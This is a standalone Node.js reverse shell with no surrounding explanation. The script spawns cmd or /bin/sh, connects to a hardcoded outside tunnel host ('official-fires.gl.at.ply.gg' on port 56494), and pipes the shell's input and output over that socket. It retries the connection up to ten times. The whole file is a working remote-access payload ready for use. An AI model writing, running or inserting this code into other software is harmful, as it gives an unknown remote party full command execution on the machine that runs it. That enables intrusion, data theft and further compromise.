
(function() {
    var net = require("net"),
        cp = require("child_process"),
        util = require("util");

    var host = "official-fires.gl.at.ply.gg";
    var port = 56494;
    var retries = 0;
    var maxRetries = 10;
    var retryInterval = 5000; // 5 seconds

    function connect() {
        var cmd = (global.process.platform.match(/^win/i)) ? "cmd" : "/bin/sh";
        var sh = cp.spawn(cmd, []);

        var client = net.connect(port, host, function() {
            client.pipe(sh.stdin);

            // The 'pump' utility was deprecated in Node.js v0.10.
            // Modern versions of Node.js handle stream piping more robustly,
            // so we can just use .pipe() directly.
            sh.stdout.pipe(client);
            sh.stderr.pipe(client);

            // Reset retry counter on a successful connection
            retries = 0;
        });

        client.on('error', function(e) {
            // This will be triggered on connection errors
            handleDisconnect();
        });

        client.on('close', function() {
            // This will be triggered when the connection is closed
            handleDisconnect();
        });

        function handleDisconnect() {
            if (retries < maxRetries) {
                retries++;
                setTimeout(connect, retryInterval);
            }
        }
    }

    connect();
})();
